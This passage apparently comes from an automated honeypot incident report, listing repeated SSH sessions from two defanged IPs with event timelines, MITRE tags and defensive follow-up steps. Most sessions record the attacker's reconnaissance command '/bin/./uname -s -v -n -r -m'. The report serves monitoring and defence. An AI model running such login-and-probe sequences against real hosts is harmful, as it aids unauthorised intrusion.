| `2026-09-07 19:54:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.142[.]201` to AbuseIPDB if not already reported
- [ ] Block `210.79.142[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de5037646c8d

| Field | Detail |
|---|---|
| **Source IP** | `210.79.142[.]201` |
| **First Seen** | 2026-09-07 19:54 |
| **Last Seen** | 2026-09-07 19:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:54:20` | `cowrie.session.connect` |
| `2026-09-07 19:54:20` | `cowrie.client.version` |
| `2026-09-07 19:54:20` | `cowrie.client.kex` |
| `2026-09-07 19:54:21` | `cowrie.login.success` |
| `2026-09-07 19:54:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.142[.]201` to AbuseIPDB if not already reported
- [ ] Block `210.79.142[.]201` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-792c1153c354

| Field | Detail |
|---|---|
| **Source IP** | `210.79.142[.]201` |
| **First Seen** | 2026-09-07 19:54 |
| **Last Seen** | 2026-09-07 19:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:54:22` | `cowrie.session.connect` |
| `2026-09-07 19:54:22` | `cowrie.client.version` |
| `2026-09-07 19:54:22` | `cowrie.client.kex` |
| `2026-09-07 19:54:23` | `cowrie.login.success` |
| `2026-09-07 19:54:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.142[.]201` to AbuseIPDB if not already reported
- [ ] Block `210.79.142[.]201` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f2a8199f7d3

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 19:54 |
| **Last Seen** | 2026-09-07 19:54 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:54:39` | `cowrie.session.connect` |
| `2026-09-07 19:54:39` | `cowrie.client.version` |
| `2026-09-07 19:54:39` | `cowrie.client.kex` |
| `2026-09-07 19:54:42` | `cowrie.login.success` |
| `2026-09-07 19:54:43` | `cowrie.session.params` |
| `2026-09-07 19:54:43` | `cowrie.command.input` |
| `2026-09-07 19:54:44` | `cowrie.log.closed` |
| `2026-09-07 19:54:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56b28b5c8a88

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 19:55 |
| **Last Seen** | 2026-09-07 19:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:55:08` | `cowrie.session.connect` |
| `2026-09-07 19:55:09` | `cowrie.client.version` |
| `2026-09-07 19:55:09` | `cowrie.client.kex` |
| `2026-09-07 19:55:11` | `cowrie.login.success` |
| `2026-09-07 19:55:13` | `cowrie.session.params` |
| `2026-09-07 19:55:13` | `cowrie.command.input` |
| `2026-09-07 19:55:13` | `cowrie.log.closed` |
| `2026-09-07 19:55:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78dba5ad0114

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 19:55 |
| **Last Seen** | 2026-09-07 19:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:55:38` | `cowrie.session.connect` |
| `2026-09-07 19:55:38` | `cowrie.client.version` |
| `2026-09-07 19:55:38` | `cowrie.client.kex` |
| `2026-09-07 19:55:41` | `cowrie.login.success` |
| `2026-09-07 19:55:42` | `cowrie.session.params` |
| `2026-09-07 19:55:42` | `cowrie.command.input` |
| `2026-09-07 19:55:43` | `cowrie.log.closed` |
| `2026-09-07 19:55:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3d2883fa2f4

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 19:56 |
| **Last Seen** | 2026-09-07 19:56 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:56:07` | `cowrie.session.connect` |
| `2026-09-07 19:56:08` | `cowrie.client.version` |
| `2026-09-07 19:56:08` | `cowrie.client.kex` |
| `2026-09-07 19:56:10` | `cowrie.login.success` |
| `2026-09-07 19:56:12` | `cowrie.session.params` |
| `2026-09-07 19:56:12` | `cowrie.command.input` |
| `2026-09-07 19:56:12` | `cowrie.log.closed` |
| `2026-09-07 19:56:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b695325d4dd6

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 19:56 |
| **Last Seen** | 2026-09-07 19:56 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:56:37` | `cowrie.session.connect` |
| `2026-09-07 19:56:37` | `cowrie.client.version` |
| `2026-09-07 19:56:37` | `cowrie.client.kex` |
| `2026-09-07 19:56:40` | `cowrie.login.success` |
| `2026-09-07 19:56:41` | `cowrie.session.params` |
| `2026-09-07 19:56:41` | `cowrie.command.input` |
| `2026-09-07 19:56:42` | `cowrie.log.closed` |
| `2026-09-07 19:56:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48fa508e1249

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 19:57 |
| **Last Seen** | 2026-09-07 19:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:57:06` | `cowrie.session.connect` |
| `2026-09-07 19:57:07` | `cowrie.client.version` |
| `2026-09-07 19:57:07` | `cowrie.client.kex` |
| `2026-09-07 19:57:09` | `cowrie.login.success` |
| `2026-09-07 19:57:10` | `cowrie.session.params` |
| `2026-09-07 19:57:10` | `cowrie.command.input` |
| `2026-09-07 19:57:11` | `cowrie.log.closed` |
| `2026-09-07 19:57:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50bf818db809

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 19:57 |
| **Last Seen** | 2026-09-07 19:57 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:57:36` | `cowrie.session.connect` |
| `2026-09-07 19:57:36` | `cowrie.client.version` |
| `2026-09-07 19:57:36` | `cowrie.client.kex` |
| `2026-09-07 19:57:38` | `cowrie.login.success` |
| `2026-09-07 19:57:40` | `cowrie.session.params` |
| `2026-09-07 19:57:40` | `cowrie.command.input` |
| `2026-09-07 19:57:41` | `cowrie.log.closed` |
| `2026-09-07 19:57:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a1b6806cd0a

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 19:58 |
| **Last Seen** | 2026-09-07 19:58 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:58:05` | `cowrie.session.connect` |
| `2026-09-07 19:58:05` | `cowrie.client.version` |
| `2026-09-07 19:58:05` | `cowrie.client.kex` |
| `2026-09-07 19:58:07` | `cowrie.login.success` |
| `2026-09-07 19:58:09` | `cowrie.session.params` |
| `2026-09-07 19:58:09` | `cowrie.command.input` |
| `2026-09-07 19:58:10` | `cowrie.log.closed` |
| `2026-09-07 19:58:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97d0b429b468

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 19:58 |
| **Last Seen** | 2026-09-07 19:58 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:58:34` | `cowrie.session.connect` |
| `2026-09-07 19:58:35` | `cowrie.client.version` |
| `2026-09-07 19:58:35` | `cowrie.client.kex` |
| `2026-09-07 19:58:37` | `cowrie.login.success` |
| `2026-09-07 19:58:39` | `cowrie.session.params` |
| `2026-09-07 19:58:39` | `cowrie.command.input` |
| `2026-09-07 19:58:39` | `cowrie.log.closed` |
| `2026-09-07 19:58:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca52e42cf174

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 19:59 |
| **Last Seen** | 2026-09-07 19:59 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:59:03` | `cowrie.session.connect` |
| `2026-09-07 19:59:04` | `cowrie.client.version` |
| `2026-09-07 19:59:04` | `cowrie.client.kex` |
| `2026-09-07 19:59:06` | `cowrie.login.success` |
| `2026-09-07 19:59:08` | `cowrie.session.params` |
| `2026-09-07 19:59:08` | `cowrie.command.input` |
| `2026-09-07 19:59:09` | `cowrie.log.closed` |
| `2026-09-07 19:59:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9ff99414105

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 19:59 |
| **Last Seen** | 2026-09-07 19:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:59:33` | `cowrie.session.connect` |
| `2026-09-07 19:59:33` | `cowrie.client.version` |
| `2026-09-07 19:59:33` | `cowrie.client.kex` |
| `2026-09-07 19:59:35` | `cowrie.login.success` |
| `2026-09-07 19:59:37` | `cowrie.session.params` |
| `2026-09-07 19:59:37` | `cowrie.command.input` |
| `2026-09-07 19:59:37` | `cowrie.log.closed` |
| `2026-09-07 19:59:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-674fa8994a96

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:00 |
| **Last Seen** | 2026-09-07 20:00 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:00:02` | `cowrie.session.connect` |
| `2026-09-07 20:00:02` | `cowrie.client.version` |
| `2026-09-07 20:00:02` | `cowrie.client.kex` |
| `2026-09-07 20:00:04` | `cowrie.login.success` |
| `2026-09-07 20:00:06` | `cowrie.session.params` |
| `2026-09-07 20:00:06` | `cowrie.command.input` |
| `2026-09-07 20:00:07` | `cowrie.log.closed` |
| `2026-09-07 20:00:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4775b8f09b32

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:00 |
| **Last Seen** | 2026-09-07 20:00 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:00:31` | `cowrie.session.connect` |
| `2026-09-07 20:00:32` | `cowrie.client.version` |
| `2026-09-07 20:00:32` | `cowrie.client.kex` |
| `2026-09-07 20:00:34` | `cowrie.login.success` |
| `2026-09-07 20:00:36` | `cowrie.session.params` |
| `2026-09-07 20:00:36` | `cowrie.command.input` |
| `2026-09-07 20:00:36` | `cowrie.log.closed` |
| `2026-09-07 20:00:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1164b7030fd6

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:01 |
| **Last Seen** | 2026-09-07 20:01 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:01:29` | `cowrie.session.connect` |
| `2026-09-07 20:01:30` | `cowrie.client.version` |
| `2026-09-07 20:01:30` | `cowrie.client.kex` |
| `2026-09-07 20:01:32` | `cowrie.login.success` |
| `2026-09-07 20:01:34` | `cowrie.session.params` |
| `2026-09-07 20:01:34` | `cowrie.command.input` |
| `2026-09-07 20:01:34` | `cowrie.log.closed` |
| `2026-09-07 20:01:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa843d52c158

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:01 |
| **Last Seen** | 2026-09-07 20:02 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:01:59` | `cowrie.session.connect` |
| `2026-09-07 20:01:59` | `cowrie.client.version` |
| `2026-09-07 20:01:59` | `cowrie.client.kex` |
| `2026-09-07 20:02:01` | `cowrie.login.success` |
| `2026-09-07 20:02:03` | `cowrie.session.params` |
| `2026-09-07 20:02:03` | `cowrie.command.input` |
| `2026-09-07 20:02:04` | `cowrie.log.closed` |
| `2026-09-07 20:02:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3830c4cd8fd

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:02 |
| **Last Seen** | 2026-09-07 20:02 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:02:28` | `cowrie.session.connect` |
| `2026-09-07 20:02:28` | `cowrie.client.version` |
| `2026-09-07 20:02:28` | `cowrie.client.kex` |
| `2026-09-07 20:02:30` | `cowrie.login.success` |
| `2026-09-07 20:02:32` | `cowrie.session.params` |
| `2026-09-07 20:02:32` | `cowrie.command.input` |
| `2026-09-07 20:02:33` | `cowrie.log.closed` |
| `2026-09-07 20:02:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f89b3978c5e

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:02 |
| **Last Seen** | 2026-09-07 20:03 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:02:57` | `cowrie.session.connect` |
| `2026-09-07 20:02:58` | `cowrie.client.version` |
| `2026-09-07 20:02:58` | `cowrie.client.kex` |
| `2026-09-07 20:03:00` | `cowrie.login.success` |
| `2026-09-07 20:03:01` | `cowrie.session.params` |
| `2026-09-07 20:03:01` | `cowrie.command.input` |
| `2026-09-07 20:03:02` | `cowrie.log.closed` |
| `2026-09-07 20:03:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0915bd65a3a

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:03 |
| **Last Seen** | 2026-09-07 20:03 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:03:26` | `cowrie.session.connect` |
| `2026-09-07 20:03:27` | `cowrie.client.version` |
| `2026-09-07 20:03:27` | `cowrie.client.kex` |
| `2026-09-07 20:03:29` | `cowrie.login.success` |
| `2026-09-07 20:03:31` | `cowrie.session.params` |
| `2026-09-07 20:03:31` | `cowrie.command.input` |
| `2026-09-07 20:03:31` | `cowrie.log.closed` |
| `2026-09-07 20:03:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68f0b281a1c6

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:03 |
| **Last Seen** | 2026-09-07 20:04 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:03:55` | `cowrie.session.connect` |
| `2026-09-07 20:03:56` | `cowrie.client.version` |
| `2026-09-07 20:03:56` | `cowrie.client.kex` |
| `2026-09-07 20:03:58` | `cowrie.login.success` |
| `2026-09-07 20:04:00` | `cowrie.session.params` |
| `2026-09-07 20:04:00` | `cowrie.command.input` |
| `2026-09-07 20:04:00` | `cowrie.log.closed` |
| `2026-09-07 20:04:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2b6b93c2f53

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:04 |
| **Last Seen** | 2026-09-07 20:04 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:04:24` | `cowrie.session.connect` |
| `2026-09-07 20:04:25` | `cowrie.client.version` |
| `2026-09-07 20:04:25` | `cowrie.client.kex` |
| `2026-09-07 20:04:27` | `cowrie.login.success` |
| `2026-09-07 20:04:29` | `cowrie.session.params` |
| `2026-09-07 20:04:29` | `cowrie.command.input` |
| `2026-09-07 20:04:29` | `cowrie.log.closed` |
| `2026-09-07 20:04:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fab8684dd8f5

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:04 |
| **Last Seen** | 2026-09-07 20:04 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:04:53` | `cowrie.session.connect` |
| `2026-09-07 20:04:54` | `cowrie.client.version` |
| `2026-09-07 20:04:54` | `cowrie.client.kex` |
| `2026-09-07 20:04:56` | `cowrie.login.success` |
| `2026-09-07 20:04:58` | `cowrie.session.params` |
| `2026-09-07 20:04:58` | `cowrie.command.input` |
| `2026-09-07 20:04:58` | `cowrie.log.closed` |
| `2026-09-07 20:04:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2102b1ff7245

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:05 |
| **Last Seen** | 2026-09-07 20:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:05:22` | `cowrie.session.connect` |
| `2026-09-07 20:05:23` | `cowrie.client.version` |
| `2026-09-07 20:05:23` | `cowrie.client.kex` |
| `2026-09-07 20:05:25` | `cowrie.login.success` |
| `2026-09-07 20:05:27` | `cowrie.session.params` |
| `2026-09-07 20:05:27` | `cowrie.command.input` |
| `2026-09-07 20:05:27` | `cowrie.log.closed` |
| `2026-09-07 20:05:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76ba0724db0a

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:05 |
| **Last Seen** | 2026-09-07 20:05 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:05:52` | `cowrie.session.connect` |
| `2026-09-07 20:05:52` | `cowrie.client.version` |
| `2026-09-07 20:05:52` | `cowrie.client.kex` |
| `2026-09-07 20:05:55` | `cowrie.login.success` |
| `2026-09-07 20:05:56` | `cowrie.session.params` |
| `2026-09-07 20:05:56` | `cowrie.command.input` |
| `2026-09-07 20:05:57` | `cowrie.log.closed` |
| `2026-09-07 20:05:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0dffd3afd7ca

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:06 |
| **Last Seen** | 2026-09-07 20:06 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:06:21` | `cowrie.session.connect` |
| `2026-09-07 20:06:22` | `cowrie.client.version` |
| `2026-09-07 20:06:22` | `cowrie.client.kex` |
